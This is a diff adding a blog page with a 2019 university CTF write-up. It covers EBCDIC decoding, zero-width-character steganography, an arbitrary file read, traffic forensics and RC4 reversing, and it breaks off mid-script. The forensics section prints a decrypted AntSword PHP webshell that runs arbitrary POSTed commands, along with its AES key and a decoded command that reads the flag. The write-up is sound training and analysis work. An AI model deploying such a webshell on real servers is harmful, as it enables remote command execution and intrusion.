@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="MISC0x01 misc11234567891011121314f = open(&apos;724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt&apos;,&apos;rb&apos;)b = f.read()a = []max = int(0)min = int(999)for i in b:    t = i    if t &amp;gt;= max:        max = i    i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019高校运维赛WriteUp">
+<meta property="og:url" content="http://yoursite.com/2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="MISC0x01 misc11234567891011121314f = open(&apos;724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt&apos;,&apos;rb&apos;)b = f.read()a = []max = int(0)min = int(999)for i in b:    t = i    if t &amp;gt;= max:        max = i    i">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-11-22T07:16:54.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019高校运维赛WriteUp">
+<meta name="twitter:description" content="MISC0x01 misc11234567891011121314f = open(&apos;724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt&apos;,&apos;rb&apos;)b = f.read()a = []max = int(0)min = int(999)for i in b:    t = i    if t &amp;gt;= max:        max = i    i">
+  <link rel="canonical" href="http://yoursite.com/2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2019高校运维赛WriteUp | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">2019高校运维赛WriteUp
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-11-21 07:16:37 / Geändert am: 23:16:54" itemprop="dateCreated datePublished" datetime="2019-11-21T07:16:37-08:00">2019-11-21</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="0x01-misc1"><a href="#0x01-misc1" class="headerlink" title="0x01 misc1"></a>0x01 misc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">b = f.read()</span><br><span class="line">a = []</span><br><span class="line">max = int(<span class="number">0</span>)</span><br><span class="line">min = int(<span class="number">999</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    t = i</span><br><span class="line">    <span class="keyword">if</span> t &gt;= max:</span><br><span class="line">        max = i</span><br><span class="line">    <span class="keyword">if</span> t &lt;= min:</span><br><span class="line">        min = i</span><br><span class="line">    a.append(hex(i))</span><br><span class="line">print(hex(max))</span><br><span class="line">print(hex(min))</span><br></pre></td></tr></table></figure>
+
+<p>导出数据观察可以发现最小值为0x2，最大值为0xF9，根据判断可见字符在这个范围内的应该为EBCDIC编码，且是CP1146（IBM EBCDIC英国编码）<br>可以编写解码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ebcdic</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(<span class="string">"724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">        print(input_file.read().decode(<span class="string">'cp1146'</span>))</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ñBuCðCx:¦@B©B£BvC·BðB¯BlB¾$EBCDIC: /eb´s@·dik/, /eb´see`dik/, /eb´k@·dik/, n. [abbreviation, Extended Binary Coded Decimal Interchange Code] An alleged character set used on IBM dinosaurs. It exists in at least six mutually incompatible versions, all featuring such delights as non-contiguous letter sequences and the absence of several ASCII punctuation characters fairly important for modern computer languages (exactly which characters are absent varies according to which version of EBCDIC you&apos;re looking at). IBM adapted EBCDIC from punched card code in the early 1960s and promulgated it as a customer-control tactic (see connector conspiracy), spurning the already established ASCII standard. Today, IBM claims to be an open-systems company, but IBM&apos;s own description of the EBCDIC variants and how to convert between them is still internally classified top-secret, burn-before-reading. Hackers blanch at the very name of EBCDIC and consider it a manifestation of purest evil.flag is flag&#123;0a07c11e46af753fd24d40023f0fdce1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最简单的方法是使用WPS Word打开文件，文件 -&gt; 文件 -&gt; 重新载入 -&gt; IBM EBCDIC英国编码</p>
+<h2 id="0x02-misc2"><a href="#0x02-misc2" class="headerlink" title="0x02 misc2"></a>0x02 misc2</h2><p>111.186.57.61:10701</p>
+<p>任意文件读取<br>读取/proc/self/fd/3 得到flag</p>
+<h2 id="0x02-misc3"><a href="#0x02-misc3" class="headerlink" title="0x02 misc3"></a>0x02 misc3</h2><p>使用010editor等十六进制编辑器打开html文件，可看见存在一段由序列<code>E2 80 8C</code>和序列<code>E2 80 8B</code>组成的隐藏字符，把<code>E2 80 8C</code>视为<code>0</code>，<code>E2 80 8B</code>视为<code>1</code>进行转换可得flag<br>在Chrome浏览器的开发者工具中打开也可以发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0827h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2  â€Œâ€‹â€‹â€Œâ€Œâ </span><br><span class="line">0837h: 80 8B E2 80 8B E2 80 8C E2 80 8C E2 80 8B E2 80  €‹â€‹â€Œâ€Œâ€‹â€ </span><br><span class="line">0847h: 8B E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C  ‹â€Œâ€‹â€‹â€Œâ€Œ </span><br><span class="line">0857h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2  â€Œâ€‹â€‹â€Œâ€Œâ </span><br><span class="line">0867h: 80 8C E2 80 8C E2 80 8B E2 80 8C E2 80 8B E2 80  €Œâ€Œâ€‹â€Œâ€‹â€ </span><br><span class="line">0877h: 8B E2 80 8C E2 80 8C E2 80 8B E2 80 8B E2 80 8B  ‹â€Œâ€Œâ€‹â€‹â€‹ </span><br><span class="line">0887h: E2 80 8C E2 80 8B E2 80 8B E2 80 8B E2 80 8B E2  â€Œâ€‹â€‹â€‹â€‹â </span><br><span class="line">0897h: 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8B E2 80  €Œâ€‹â€‹â€Œâ€‹â€ </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0000h: 01100110 01101100 01100001 01100111 01111011 01100101 00110010 01100001  flag&#123;e2a </span><br><span class="line">0008h: 00111001 01100011 00111000 01100010 00110001 00110001 00110111 00110101  9c8b1175 </span><br><span class="line">0010h: 01100101 00110110 00110110 01100011 01100110 00110010 00110001 01100110  e66cf21f </span><br><span class="line">0018h: 00111000 00110101 00111001 00110011 01100010 01100011 00111000 00110101  8593bc85 </span><br><span class="line">0020h: 01100010 01100110 00111001 00110011 00111001 01111101                    bf939&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-webshell"><a href="#0x03-webshell" class="headerlink" title="0x03 webshell"></a>0x03 webshell</h2><p>分析流量可知，在服务器上执行的shell解密后大致如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    $key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"8c2b4"</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"e2e10"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $p = base64_decode($_POST[<span class="string">"0x1b4d456c7297d"</span>]);</span><br><span class="line">    $s = base64_decode($_POST[<span class="string">"0xb9b45688a5a08"</span>]);</span><br><span class="line">    $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">    $c = substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> ? <span class="string">"-c \"&#123;$s&#125;\""</span> : <span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">    $r = <span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $d = explode(<span class="string">","</span>, @ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">            $d = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $d = array_map(<span class="string">'trim'</span>, array_map(<span class="string">'strtolower'</span>, $d));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @system($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @passthru($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($c, $o, $ret);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>, $o));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">            $fp = @popen($c, <span class="string">'r'</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof($fp)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets($fp, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($fp);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">            @antsystem($c);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $ret = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    $ret = @runcmd($r . <span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">    <span class="keyword">print</span> ($ret != <span class="number">0</span>) ? <span class="string">"ret=&#123;$ret&#125;"</span> : <span class="string">""</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR://"</span> . $e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ed3edq113</span></span><br></pre></td></tr></table></figure>
+
+<p>在第七个HTTP流中，读取了flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [4]: base64.b64decode(&apos;Y2QgIi92YXIvd3d3L2h0bWwvdG1wIjtjYXQgZmxhZ3xiYXNlNjQgO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&apos;)</span><br><span class="line">Out[4]: b&apos;cd &quot;/var/www/html/tmp&quot;;cat flag|base64 ;echo [S];pwd;echo [E]&apos;</span><br></pre></td></tr></table></figure>
+
+<p>flag经过了一层base64加密，在asoutput方法中增加了前后缀，然后在套一下base64，顺便AES加密<br>响应的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5</span><br></pre></td></tr></table></figure>
+
+<p>解密脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$r=file_get_contents(<span class="string">"enc"</span>);</span><br><span class="line">$key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line"><span class="keyword">echo</span> openssl_decrypt(base64_decode($r), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag:<strong>flag{AntSword_is_Powerful_3222222!!!!}</strong></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p><code>init_array</code>和<code>fini_array</code>都有一个函数，在<code>init_array</code>里的函数里加了反调，直接<code>patch</code>即可，然后还把<code>key</code>修改了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = aThisIsNotKey;</span><br><span class="line">      aThisIsNotKey[j] ^= <span class="number">7u</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>fini_array</code>才是最后的比较函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)byte_202040[i + <span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( byte_2020E0[i] != (_BYTE)result )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>加密函数是RC4算法，解题脚本为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">key = <span class="string">"sontXntXihsXlb~&amp;"</span></span><br><span class="line">data = <span class="string">"A"</span>*<span class="number">0x10</span></span><br><span class="line">rc41 = ARC4.new(key)</span><br><span class="line"><span class="comment"># part1 = rc41.decrypt('78695a5c2515935f6d150711ee01b3ab'.decode('hex'))</span></span><br><span class="line">part2 = rc41.decrypt(<span class="string">'7f305e5f1619bf7471131025d75fe1ff'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> part2</span><br></pre></td></tr></table></figure>
+
+<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>32元一次方程组,把数据扣出来在到在线网站上解密（</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 